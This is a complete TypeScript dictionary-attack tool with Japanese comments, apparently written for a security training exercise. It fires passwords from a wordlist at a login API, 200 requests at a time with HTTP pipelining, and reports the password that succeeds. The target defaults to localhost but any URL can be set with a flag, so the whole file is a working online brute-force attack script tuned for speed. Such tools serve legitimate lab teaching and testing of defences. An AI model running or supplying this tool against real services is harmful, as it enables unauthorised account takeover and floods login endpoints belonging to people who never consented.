#!/usr/bin/env tsx
/**
 * dictionary-attack.ts
 * 辞書攻撃ツール（実習用） — 高速版
 *
 * undici Pool + Semaphore による高速HTTP通信
 * ※ 認証は必ずHTTP経由で行います（外部攻撃シミュレーション）
 *
 * 使い方:
 *   npm run attack -- --target <username> [options]
 *
 * オプション:
 *   --target       <string>   攻撃対象のユーザー名 (必須)
 *   --wordlist     <path>     パスワードリストのパス (デフォルト: dict.txt)
 *   --url          <string>   ベースURL (デフォルト: http://localhost:3000)
 *   --limit        <number>   試行上限数 (デフォルト: 無制限)
 *   --concurrency  <number>   同時リクエスト数 (デフォルト: 200)
 *   --log-interval <number>   進捗ログの出力間隔ミリ秒 (デフォルト: 50ms)
 *   --verbose                 全試行のログを出力 (--log-interval より優先)
 */

import fs from 'fs';
import path from 'path';
import { Pool } from 'undici';

// ─── CLI 引数パース ────────────────────────────────────────────────────────────

const args = process.argv.slice(2);

function getArg(flag: string): string | undefined {
  const idx = args.indexOf(flag);
  return idx !== -1 ? args[idx + 1] : undefined;
}

function hasFlag(flag: string): boolean {
  return args.includes(flag);
}

const TARGET   = getArg('--target');
const WORDLIST = getArg('--wordlist') ?? path.resolve(process.cwd(), 'dict.txt');
const BASE_URL = getArg('--url')      ?? 'http://localhost:3000';
const LIMIT          = getArg('--limit')        ? parseInt(getArg('--limit')!,        10) : Infinity;
const CONCURRENCY    = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 200;
const LOG_INTERVAL_MS = getArg('--log-interval') ? parseInt(getArg('--log-interval')!, 10) : 50;
const VERBOSE        = hasFlag('--verbose');
const API_URL        = `${BASE_URL}/api`;

if (!TARGET) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: '--target オプションは必須です。例: npm run attack -- --target admin',
  }, null, 2));
  process.exit(1);
}

if (!fs.existsSync(WORDLIST)) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: `パスワードリストが見つかりません: ${WORDLIST}`,
  }, null, 2));
  process.exit(1);
}

// ─── セマフォ（O(1) 並行制御）──────────────────────────────────────────────────

class Semaphore {
  private permits: number;
  private readonly queue: Array<() => void> = [];

  constructor(permits: number) {
    this.permits = permits;
  }

  acquire(): Promise<void> {
    if (this.permits > 0) {
      this.permits--;
      return Promise.resolve();
    }
    return new Promise<void>((resolve) => this.queue.push(resolve));
  }

  release(): void {
    if (this.queue.length > 0) {
      this.queue.shift()!();
    } else {
      this.permits++;
    }
  }
}

// ─── ログ出力ヘルパー ──────────────────────────────────────────────────────────

function log(obj: Record<string, unknown>): void {
  console.log(JSON.stringify({ timestamp: new Date().toISOString(), ...obj }));
}

// ─── undici Pool（接続プール + パイプライニング）────────────────────────────────

let _pool: Pool | null = null;
function getPool(): Pool {
  if (!_pool) {
    const url = new URL(BASE_URL);
    _pool = new Pool(`${url.protocol}//${url.host}`, {
      connections: CONCURRENCY,
      pipelining: 10,       // 1接続でHTTPリクエストを多重化
      keepAliveTimeout:    60_000,
      keepAliveMaxTimeout: 60_000,
      headersTimeout:      10_000,
      bodyTimeout:         10_000,
    });
  }
  return _pool;
}

// リクエストパスを一度だけ計算
const _apiPath = (() => {
  const u = new URL(BASE_URL);
  return `${u.pathname.replace(/\/$/, '')}/api`;
})();

// usernameのJSONプレフィックスをキャッシュ
const _bodyPrefix = `{"username":${JSON.stringify(TARGET ?? '')},"password":"`;
const _bodySuffix = `"}`;
const _prefixLen  = Buffer.byteLength(_bodyPrefix);
const _suffixLen  = Buffer.byteLength(_bodySuffix);

// ─── ログイン試行（undici Pool で接続再利用）──────────────────────────────────

async function tryLogin(password: string): Promise<{
  success: boolean;
  status: number;
  body: unknown;
}> {
  const escapedPw   = password.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  const requestBody = _bodyPrefix + escapedPw + _bodySuffix;
  const contentLen  = _prefixLen + Buffer.byteLength(escapedPw) + _suffixLen;

  const { statusCode, body } = await getPool().request({
    path:    _apiPath,
    method:  'POST',
    headers: {
      'content-type':   'application/json',
      'content-length': String(contentLen),
    },
    body: requestBody,
  });

  if (statusCode === 200) {
    const data = await body.json();
    return { success: true, status: statusCode, body: data };
  }

  // 失敗時はストリームを読み捨てる（バッファ確保なし）
  body.resume();
  await new Promise<void>((resolve) => {
    body.once('end',   resolve);
    body.once('error', resolve);
    body.once('close', resolve);
  });
  return { success: false, status: statusCode, body: null };
}

// ─── メイン処理 ───────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const startTime = Date.now();

  const passwords: string[] = fs.readFileSync(WORDLIST, 'utf8').split(/\r?\n/);
  const totalWords = passwords.filter(p => p.trim() !== '').length;

  log({
    event: 'start',
    target: TARGET,
    wordlist: WORDLIST,
    total_words: totalWords,
    api_url: API_URL,
    limit: LIMIT === Infinity ? 'unlimited' : LIMIT,
    concurrency: CONCURRENCY,
    log_interval: VERBOSE ? 'verbose (all)' : `${LOG_INTERVAL_MS}ms`,
    verbose: VERBOSE,
  });

  let attempt       = 0;
  let queued        = 0;
  let skipped       = 0;
  let found         = false;
  let foundPassword: string | null = null;
  let lastPassword  = '';

  // ─── 時間ベースのプログレスログ（ホットパスから完全切り離し）─────────────
  let progressTimer: ReturnType<typeof setInterval> | null = null;
  if (!VERBOSE) {
    progressTimer = setInterval(() => {
      if (attempt === 0) return;
      const elapsedSec = ((Date.now() - startTime) / 1000).toFixed(1);
      const rate       = (attempt / parseFloat(elapsedSec)).toFixed(0);
      const progress   = totalWords > 0
        ? ((attempt / totalWords) * 100).toFixed(2) + '%'
        : 'N/A';
      process.stdout.write(
        JSON.stringify({
          timestamp:    new Date().toISOString(),
          event:        'progress',
          attempts:     attempt,
          total_words:  totalWords,
          progress,
          elapsed_sec:  parseFloat(elapsedSec),
          rate_per_sec: parseInt(rate, 10),
          last_password: lastPassword,
        }) + '\n',
      );
    }, LOG_INTERVAL_MS);
  }

  // Semaphore で O(1) の並行制御
  const sem = new Semaphore(CONCURRENCY);

  const runOne = async (password: string): Promise<void> => {
    // sem はループ側で acquire 済み
    try {
      const result = await tryLogin(password);
      attempt++;
      lastPassword = password;

      if (VERBOSE) {
        log({
          event: result.success ? 'hit' : 'miss',
          attempt,
          target: TARGET,
          password,
          status: result.status,
        });
      }

      if (result.success) {
        found         = true;
        foundPassword = password;
        const user    = (result.body as { user?: Record<string, unknown> }).user ?? null;
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        const message = `Target:${TARGET} Password:${foundPassword}`;

        log({
          event: 'success',
          target: TARGET,
          password: foundPassword,
          attempt,
          elapsed_sec: parseFloat(elapsed),
          user,
          message,
        });
      }
    } catch (err) {
      attempt++;
      log({ event: 'request_error', attempt, password, error: String(err) });
    } finally {
      sem.release();
    }
  };

  // ループ側で acquire → バックプレッシャーにより CONCURRENCY 件ぶんだけ先行

  for (const rawPassword of passwords) {
    if (found) break;

    const password = rawPassword.trim();
    if (password === '') {
      skipped++;
      continue;
    }

    if (queued >= LIMIT) {
      log({ event: 'limit_reached', limit: LIMIT, attempts: queued });
      break;
    }

    queued++;
    await sem.acquire();           // 空きスロットを待つ（バックプレッシャー）
    if (found) { sem.release(); break; }
    void runOne(password);         // fire-and-forget
  }

  // 全スロットを再取得 = すべてのワーカーが完了した証明
  for (let i = 0; i < CONCURRENCY; i++) {
    await sem.acquire();
  }

  // プログレスタイマー停止
  if (progressTimer) clearInterval(progressTimer);

  // 接続プールを閉じる
  if (_pool) await _pool.close();

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);

  if (!found) {
    log({
      event: 'exhausted',
      target: TARGET,
      total_attempts: attempt,
      skipped_lines: skipped,
      elapsed_sec: parseFloat(elapsed),
      message: 'パスワードリストを使い切りましたが、一致するパスワードは見つかりませんでした。',
    });
  }

  if (found) {
    log({
      event: 'end',
      result: '!!!!! PASSWORD FOUND !!!!!',
      target: TARGET,
      password: `>>>  ${foundPassword}  <<<`,
      total_attempts: attempt,
      elapsed_sec: parseFloat(elapsed),
      rate_per_sec: attempt > 0 ? parseFloat((attempt / parseFloat(elapsed)).toFixed(1)) : 0,
      message: `パスワードが見つかりました！ ユーザー「${TARGET}」のパスワードは「${foundPassword}」です`,
    });
  } else {
    log({
      event: 'end',
      result: 'not_found',
      target: TARGET,
      total_attempts: attempt,
      skipped_lines: skipped,
      elapsed_sec: parseFloat(elapsed),
      rate_per_sec: attempt > 0 ? parseFloat((attempt / parseFloat(elapsed)).toFixed(1)) : 0,
      message: 'パスワードは見つかりませんでした',
    });
  }
}

main().catch((err) => {
  log({ event: 'fatal', error: String(err) });
  process.exit(1);
});
